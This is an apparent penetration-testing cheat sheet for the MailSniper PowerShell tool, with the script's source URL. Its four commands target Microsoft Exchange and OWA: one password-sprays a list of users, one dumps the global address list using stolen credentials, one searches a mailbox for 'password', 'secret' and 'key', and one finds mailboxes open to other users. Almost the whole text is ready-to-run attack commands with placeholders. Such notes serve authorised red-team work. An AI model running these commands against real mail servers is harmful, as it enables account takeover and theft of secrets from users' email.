### Source
https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1  

### Passwordspray
```
Invoke-PasswordSprayOWA -ExchHostname &lt;rhost&gt; -UserList &lt;userFile&gt; -Password &lt;password&gt;
```

### Extract address book
```
Get-GlobalAddressList -ExchHostname &lt;rhost&gt; -UserName &lt;domain&gt;\&lt;user&gt; -Password &lt;password&gt; -OutFile &lt;outFile&gt;
```

### Search for passwords inside last 100 e-mails for the current user session
```
Invoke-SelfSearch -Mailbox &lt;user&gt;@&lt;domain&gt; -Terms "*password*","*secret*","*key*"
```

### Find mailboxes with permissions set to allow other users access
```
Invoke-OpenInboxFinder -EmailList .\&lt;file&gt;.txt
```


